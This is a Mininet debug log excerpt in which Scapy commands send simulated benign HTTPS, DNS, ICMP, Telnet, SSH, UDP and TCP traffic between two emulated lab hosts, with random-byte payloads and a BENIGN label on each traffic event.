+2025-07-13 20:56:09,919 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=443, dport=443, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:09,980 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:10,523 - mininet - DEBUG - 
+2025-07-13 20:56:10,523 - BENIGN - DEBUG - Generated HTTPS SYN-ACK from h5:443 <- h3:59087 [len=54B]
+2025-07-13 20:56:10,536 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=59087, dport=443, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:10,597 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:11,133 - mininet - DEBUG - 
+2025-07-13 20:56:11,133 - BENIGN - DEBUG - Generated HTTPS ACK from h3:59087 -> h5:443 [len=54B]
+2025-07-13 20:56:11,146 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;https_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=59087, dport=443, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'3ab04870a0fbf873d4d4c5f7a3d53a17af1e6fe835e67c7baf7c103550a8bc1d37615c0e18fbc522ecebe4bd4bd39758d66abe33268c6bc2fdf5611fdbcf6689e9f9ac3cd8f4670872356fa6f7270dd3b2be96008575efdb3ee66a20442280d2801f2e8815f0d98f50f47cf0b7643ff83b32edcaa7eac17fdaf062ae0f34294950f741cfda0d329d55d91c0c3828eeeb6add11881d8dabb8833244cf2f6836f60604e79d76ec5087bb6bfdae3929c5ee3d439bc41d86845b12c28a78e9fc0500c0c5cf25224a39b799741a53aae4b7c1b5da5528691cc377ffb32dfe64733ff32cb7ea73918000d406466e56f2f7fe5dab3188eae1b3b07f9d03bd63d324e10d401d38d97a9c9fd31d5a7b65e133dcd68202450563e0e8562d8e11a588f7db0ad5e5c628be48dd3cd8153554b70fa7cb568f95bfa3f7d451e6dc934c745a4b9680a3410165ab4abfe88478cafc1bec41a27dee07ec9a6a4286c1e64690c1edd0cda7aba1e7bfd3f7fb1e8053eb28778a876c4d39f313035d0af13032fd575704eb9a5ff39bba13a80bc98ee6aab7ef97b52e3ed1bf297e0b59b200b3363f319f31bf51a502059b6ffa46767780690c9dd124e09c4069995af410cea4311c0821831c2671295f65d7908e2a393d56fef2c94623a0afeefa8182ab47ec33f5d6c87b32f8341035d1c8e03e8d975921857944ccaff074cf3399083f49cec88a4385987dca135eb4cdb6c5f74bc278592152073b6b68b1c191971d0cedde4904694cf643e1be28afc2be8737d81cca1ee509a6c7fb89d5b3b8e9ffde5cbd30ed42cb433788aeaba9f21903c5e903ea8a1eedc5469b92f45c4eb7111e0aa33350d7b11158b428999f8a9d5f75ffdf58ba0d943d52600e2801ba4d74bb95078068ba1b891f24b1a8281e3afb5a57e2e9c3004a9d09821ef5acca0d11b197632a589e8fff20adacc04c1979c46b9980bfb19ecf60e7f1fade801a20392081e7c7fea182a171b48616e88c587b137d3c87b738cec806d3156c6d720c3a017cd9e6af8ddd14f7c8e42d7d96219ce1b74ab8ac6b2d6116d8145ddd\')); sendp(https_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:11,207 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:11,755 - mininet - DEBUG - 
+2025-07-13 20:56:11,756 - BENIGN - DEBUG - Generated HTTPS data traffic from h3:59087 -> h5:443 [content='Encrypted Application Data'] [Session 7] [len=812B]
+2025-07-13 20:56:11,756 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=443, dport=443, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:11,817 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:12,359 - mininet - DEBUG - 
+2025-07-13 20:56:12,359 - BENIGN - DEBUG - Generated HTTPS ACK reply from h5:443 <- h3:59087 [len=54B]
+2025-07-13 20:56:12,360 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;dns_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/UDP(sport=25362, dport=53)/DNS(rd=1, qd=DNSQR(qname=\'example.com\')); sendp(dns_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:12,420 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:12,982 - mininet - DEBUG - 
+2025-07-13 20:56:12,982 - BENIGN - DEBUG - Generated DNS query from h3:25362 -> h5:53 [qname='example.com'] [Session 8] [len=71B]
+2025-07-13 20:56:13,083 - mininet - DEBUG - *** h3 : ('ping -c 1 10.0.0.5 > /dev/null',)
+
+2025-07-13 20:56:13,087 - mininet - DEBUG - 
+2025-07-13 20:56:13,087 - mininet - DEBUG - *** h5 : ('ping -c 1 10.0.0.3 > /dev/null',)
+
+2025-07-13 20:56:13,090 - mininet - DEBUG - 
+2025-07-13 20:56:13,090 - BENIGN - DEBUG - Generated ICMP traffic 1 [len=84B]
+2025-07-13 20:56:13,090 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=23891, dport=12345, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:13,151 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:13,692 - mininet - DEBUG - 
+2025-07-13 20:56:13,692 - BENIGN - DEBUG - Generated TCP SYN from h3:23891 -> h5:12345 [len=54B]
+2025-07-13 20:56:13,707 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=12345, dport=23891, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:13,768 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:14,311 - mininet - DEBUG - 
+2025-07-13 20:56:14,311 - BENIGN - DEBUG - Generated TCP SYN-ACK from h5:12345 <- h3:23891 [len=54B]
+2025-07-13 20:56:14,321 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=23891, dport=12345, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:14,383 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:14,933 - mininet - DEBUG - 
+2025-07-13 20:56:14,933 - BENIGN - DEBUG - Generated TCP ACK from h3:23891 -> h5:12345 [len=54B]
+2025-07-13 20:56:14,947 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;tcp_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=23891, dport=12345, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'a1f5a10a67970eef8f53fd3e4ded117d172d0b3e4e7430f4f139ab5242d1acb7287f4a1c38f3dbd7c8260b345ce809529102260eb6361b6fa020b3366ffb4e02d63d73814329c57cca728280c915882565fa5588b05327e539dd1cd62f1c6b203c1360cf572ef45eeb7f0e527956506a5aaf8fc1f68008d638ed3682315c28f1557c4da19f83d13f9d98a31ebec2a5287492f58fabfbe081417431fe1fee705f401a068e3b03a721e6ce14d832a91348cc41721c128d0634b1b44dde19c7e6998e7ba99fa07b4612b3593e4fe13b1b52e59b70936755bfeb6d085cb9988be16ee8901c4a3f088827a65cc2bb1bb79c40b661d012a3ef862ad07bd537ccd71dda37b64a4a0cf4d660efd20bf2ba140e8b98298f719ba34e5de8204fad3c4838e0e4b87925c5ca3db32eeabc5fbbd85bfebf8698c940c378441ccd2b4d2de600f69b9ab818fb6bc698d6ede20bb9728dd90bf3b8691ae2cea3c61ffa2f93945b576c11bbaea28278c53bfc3614fe7dfbc714ceb85b66b47310daabd127f8269ff926a47b80dfdf8276c83b2cd713109fa827e3d4327e5829eef6c0ad64f3be2dd49a7499a8df09db1e20df16cc312bda5805795b0f5201947dede3a22d149b83135a43b76608a848e5aadf58e69bfad9c5e86b0e84dfd3fd5004b57af0d475a99b99c579aec8dc0ad3a2902bd3edc784c0cdea21186394bc7d0b9d04350a9b1be6abca940a785b1a60d8d719f04009fa0494d297fcff32b10a96ffff59e13148a76f3d49b405f8cbafad06e95057e5d872ad5ec43889bdfbced462747caf5bbb30c94907598da30a5288285128623ad584f862bb36c35d3ca9c8eb827ee60252fbc1790c37674160dea29571ac330347b2a66ae93e7a1da85eb664a01fc57de8ccb766fa825fbf865b711e8c19ba0740aa5dc2e845dc98f8a508c67641c95ba0ef70d654f7f42ba7b985706bb53f49bfc8b810b0ec0f533f6f0f855f0576255f23bad526a6f600d343932ecfa224d638f43c2839f50f03c8af04d44427e281a6131e9f0e418877fab056efc062e186d545c30cbb9e54c83430984f7813b3e401b04acbce82a82ad394df7054b2678016c02e02402a7d0f5d93d7bc8a8ac8a8ae023097cc64601ac073dc0ad97a86872b84ec6d7c3e740113cffac245adb94fa02f6a11e232fa472f8b5bd9d5c5ee2cff0d\')); sendp(tcp_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:15,008 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:15,560 - mininet - DEBUG - 
+2025-07-13 20:56:15,560 - BENIGN - DEBUG - Generated TCP data traffic from h3:23891 -> h5:12345 [content='TCP data'] [Session 9] [len=902B]
+2025-07-13 20:56:15,560 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=12345, dport=23891, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:15,621 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:16,172 - mininet - DEBUG - 
+2025-07-13 20:56:16,172 - BENIGN - DEBUG - Generated TCP ACK reply from h5:12345 <- h3:23891 [len=54B]
+2025-07-13 20:56:16,172 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;udp_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/UDP(sport=2483, dport=12346)/Raw(load=bytes.fromhex(\'10e2e985182567342b1b3843a34b07a561c14523423bc52c98b3bc867ee16c17424996501849fc008158d25096793d463c03c0efbead238953d566b71ef5ce9316d52428fcf00f1739ff978c4f00b7a82edda3563f3d48545a73e4bc2f2407aaa0b1f445c5ea2aea1e77801a05f18d84b0d025e16c4eb237b0d340d995e4123f51dc43b316beae10eb3124c3c33f3c47dfa4bc9eb8d73677a7fe19a81f279dbc7c3ba1c8f82cd3edb45d4ae0c54db66e879f752a16a8a6e7e453e2459a392cd46d5c535d74c9bbaecea218f10fd06c1cb40f41a70f4c006625ee735659760d8f10cce9ffa846cdfbe7396d1606cd0b5ae07dc2dc72613e42339e757b9e68157a988a4831a36c5e4ae52f29230fd11ea00cdfde84806aae0eedce51a567524dd11b85544c97f8080dda2949f50ff42ed1916b9ec3f5f99c796559acd154f8a01e822949a22b925f2014a8fff04017a1d75ff6cc85c9b55fd363d3b5f685e73ce503877563b153c27f4ef6a5b3dabdca41c625b8be71eb1c68e2f36b3a77483c1bfa581105b3eff00333017d493184a7bacef6da1baf229ac2531868a94b4266b44b8cc5891401012291e40efdd2e04eff7ba38c03c1c13cad994a422a0246ef1af601ab3fb01b24da841ec2f3c312f3746f0b833367ae84f82570d5e9277eb81e80470072f34a4637b903e55952bca881753a2afa1fcdf7b4404f3a667e84f096e550143a56e43837bc6db0fa1e45d0704252de8e447b9b341204c3e53ef62a67b009e4f22c5380f37c84c5e0064aaa1c6d73558249cf63b8597b12b97f6793ea61d614063204c1ebda4d3d7fe179410a2e90209c772942f896107da9413c3739b6c787ffef75dc4d46380d\')); sendp(udp_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:16,233 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:16,796 - mininet - DEBUG - 
+2025-07-13 20:56:16,796 - BENIGN - DEBUG - Generated UDP traffic from h3:2483 -> h5:12346 [content='10e2e985182567342b1b3843a34b07a561c14523...'] [Session 10] [len=661B]
+2025-07-13 20:56:16,796 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=1060, dport=23, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:16,857 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+2025-07-13 20:56:16,857 - mininet - DEBUG - 
+  import cryptography
+
+2025-07-13 20:56:17,400 - mininet - DEBUG - 
+2025-07-13 20:56:17,400 - BENIGN - DEBUG - Generated Telnet SYN from h3:1060 -> h5:23 [len=54B]
+2025-07-13 20:56:17,412 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=23, dport=1060, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:17,473 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:18,044 - mininet - DEBUG - 
+2025-07-13 20:56:18,044 - BENIGN - DEBUG - Generated Telnet SYN-ACK from h5:23 <- h3:1060 [len=54B]
+2025-07-13 20:56:18,054 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=1060, dport=23, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:18,116 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:18,652 - mininet - DEBUG - 
+2025-07-13 20:56:18,652 - BENIGN - DEBUG - Generated Telnet ACK from h3:1060 -> h5:23 [len=54B]
+2025-07-13 20:56:18,666 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;telnet_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=1060, dport=23, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'b40b12926f518a1e0832f97ccaddb5ae2e6c9039b6b84a69132cc38ae5c25931485a5797cc141ae5825bc44025ce0156e3b78f2f918170dd501ce36feb674aa493fb73171170177ffa1efb79ffc5506e039d0c584905d34bdf96a2cec3999e04a390fd50d7e4afb0f1d5c8f1bf105f3bbcdfe25df1dbc5fae123fa8cfd857e565458b5f927cd7797acccb9420cdee3ef63c63aae6a9627f22d9abea82ed29772ad5fa6ac00cc06ef06b3730d1cd90fc27d074b670f231e9506392056354144c442734603d8ad97559f98bf6ab317495ef6ca5bdddee70d8e8e0d343e7fc991f24b45f92e6f6265a001c7a95953496064ee238f1a3a24f0cfd9752ea8cc45ea8c748cf72e74dbc209c1d48ca67ea92fe2ef2091273a8a10957d11fd814abc073f919b340e0d06669b12bc94f33bbc4a83a5dc0b7662658f865b5c57c645dc2e767771e408ae95a9d6077eca658c51fe24508443e5dc068179743b3935aa7e8710ef4dd141c962d52e2e3adb49ace7f360509ca55ee4e6da1ac570c30b75019dfbd3fedcc2cab4387aa0d8b1e1b9c44880754a50b812b8841aef757015635f62b4665fc01c897910943905049350d5e812a037b6f30e3f8e731b9bc4fe9d770183c69207e66b2dfc58769992ff97f2102fd3044c51b59ceaacbd3f9d23155670d55cecd91ce6079b52a4ec5e405377e641428c1d05eaf0139f49c2f0c2f6c65621e778a916fd4a652b84150f166d1eb8b2b22285548bff0543b2ccf3b88486e47779cc1f714a048110621b386e69ca2864c258ee15b7d93e1e8efa1c98b226e6b08cc6d9fce336dc4c44b9128e19263a0c20d5c22f582444d851cfb49c197b52c1682fec16bd29a5f5b87e5390b541ed5ef2f660d6fcc78c75fc285648a3b41b12859ff1835ddabb9f5d0b7ab9600da06e92fa935bfe8279a3b5dd0783fc46aacc1230c1d6b0845f61fcbbfacbeddb90b7851765684721012f0b0bd6040db8cb5122be7d0680a6ecc1d5b94369ed77781519bc8e0f84d944c027d4b111fe6f5f89e42ac81d7540d96f71161d30810e0d13266c530e3a2e646e2f448526359d3ae82008f69c257216326017cf379a18bccbce6a998237539137c30ed7ea7c53e2ddfb6597b3f4c0e93f2dfef0e50478a44232b2935bdf6037f3fd50767583b4673a2da05eacaa7007803b6ddf76ec3ef824dbc549976aabfe80169fbd17bb7574e7a6b1443d025266770d5bf290b71e4b0f1456628783c305625c345c688bb8cfc95e736c2f748a864c05ae50bd87f559d5dc27d3d4c6156bad0e124fd7d97e469706b1aecc37fb820da661a6d824ee10954c65d515716aef9513ceb461e03693eed1a6bc52f29fe6a489ecbb99f0942a8c22988090250159240742a6f96d0ff67aa3b8f8d9783b330e2016d4db9d1a9071a895027d656430c41817153efce0541dd65474c00322ad81ba3de247710a54ef59bf2a4cd5b02061a97f91261c784bd9e78809ca\')); sendp(telnet_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:18,728 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:19,304 - mininet - DEBUG - 
+2025-07-13 20:56:19,304 - BENIGN - DEBUG - Generated Telnet data traffic from h3:1060 -> h5:23 [content='Telnet command'] [Session 11] [len=1114B]
+2025-07-13 20:56:19,305 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=23, dport=1060, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:19,366 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:19,908 - mininet - DEBUG - 
+2025-07-13 20:56:19,908 - BENIGN - DEBUG - Generated Telnet ACK reply from h5:23 <- h3:1060 [len=54B]
+2025-07-13 20:56:19,908 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=25108, dport=22, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:19,969 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:20,531 - mininet - DEBUG - 
+2025-07-13 20:56:20,531 - BENIGN - DEBUG - Generated SSH SYN from h3:25108 -> h5:22 [len=54B]
+2025-07-13 20:56:20,544 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=22, dport=25108, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:20,605 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:21,178 - mininet - DEBUG - 
+2025-07-13 20:56:21,178 - BENIGN - DEBUG - Generated SSH SYN-ACK from h5:22 <- h3:25108 [len=54B]
+2025-07-13 20:56:21,192 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=25108, dport=22, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:21,253 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:21,789 - mininet - DEBUG - 
+2025-07-13 20:56:21,789 - BENIGN - DEBUG - Generated SSH ACK from h3:25108 -> h5:22 [len=54B]
+2025-07-13 20:56:21,802 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ssh_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=25108, dport=22, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'6f54e1c974ccbfc84ac08f90ebd2b4fa21d21e98390639e2bd453751a3d2ded7f5808f928e53554bcfa81f519622648f519688003692bfd3bab74c222555c4cb5e35ad966c9620e9f54955c867b52314680bd1fb20285dcb700fc464a6bfb1f6831b24abb42e0b2748a09f9ffe839f7fb355ca8378df69a4f98e0e8e2af39bc89b2037372b30bb46a9f2b834dc2839919edac42a0157c26ebed054c2eabde43fcd88c07618dbfd06feeb72618c56f2e46414fc70503dd3eeb1961e7887a411a1d95530ec0602c791e09493d7fedad3738bf53590b0770c17be5f16de80544e037d1e92c2e1be84ed56ffd61aff8fb1a7b2eedc3d83ece7683247917314f670266625f06f8e7f0226157d34eb4d0da51566ee0da2a08aa388f317ab86e90e3b925337372647ab659cf1a09e3e4cb63199bbce54c8e0a3a51c3bd87b9c70c6b24d6efa7a5b50496d9646b8757dcfd83140489824ce4635aa586150bd9f51a16ec022fd9ae3d084dd99e2adf93c55530e9bba9504952051869a67e8a2b454003577efaecf8586b6956c16dedf4cfdcbd21ae8c46a61e2c5656d0d2311f7a4c930b4cecb5e11256aaa3f3ae26eec05ca790a52dca59858e232eb64d1fc620fff753f1fea2308d14f123bce32a7afadbd48d5774f2cfde167984f179b297a7392e7e3330495503470eedd215a8b093916c8cf38d3c1ee79eef8ccf16cfe62df22b7f3475c12e81fb95a673cb9c5b077cb6c210dd8849e2a934c054a5f0cd490871b2c7805d731575ca96190eb179e7f39885473f4938f3ecf89dbd81dd471df58437d1c6b06f6341c26d19c1b896cbbaa99beb69b89d9497f00acbff2d6711ab055c64ad8d697c08d593941bd5416ca95308c0e3b25b6e7ef826a442c0285a7c363a13676517e75544f79b1372c35ded64d9892a1f697579f36757a1d9abb0f3a89e2677cc5e2f0a504a8c49de83a2c9ef82e87c0124ac2a82d5d11895adde65310aa77167853c8583bc104f30dc8b59a5bf32b700565d59102d3f159caaf5af33d445576769218a184136407747ac929e2abeb0e66ad6ea3c5ddecafb82b20b5091dedc5f5075d356ef323c159114d7c9307e5912520f1aeae254b51a0dc1d88c9b39ffdacea4ceca414384207d3f7ea7d0c984ecd4200ed514142877992943b06d01ea59782ca9b958458cabd63958a7c2352dc53a7b3bbc95a315aa769ae6f1e0e602d320ff87755f46762118d66b478b0bbbe1f5057338dbd62cf23504104844166791b35f5d488a1d4216f30425bfa63f9ef5d40ba2230abe8c81ab549c67970d9f6954732bf6344d880c67aa8a87a9024a897fb4d636e15de4983db499be88f47403e5a3bdf7109a5d4a3ac8fd2b0cc23765defb99fd2948029771f9b4dda02fc86e4ee97c2a7e7de564ba0efba5d92388c5fb0d60381e77997be51eaea8b7a3402f13a09e08996287c6f59c5ba51c2379954f26f09be3e429834ff0f8c4de66f439df821ac0711585f9754205726ae631bc77b9227e2f9ff4e5e270311ba017459178aa229a97363302620c2330af2a739607f2b6b9def48f02f4c219b6a41b8f0944e97a4a6af9fb82b63af44416ff04bd80402b56c2a957624ac8437f40f1ed69de66016b984075b7b2ef662a4617ab7a7cb8aa7876768\')); sendp(ssh_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:21,863 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:22,413 - mininet - DEBUG - 
+2025-07-13 20:56:22,414 - BENIGN - DEBUG - Generated SSH data traffic from h3:25108 -> h5:22 [content='SSH encrypted data'] [Session 12] [len=1231B]
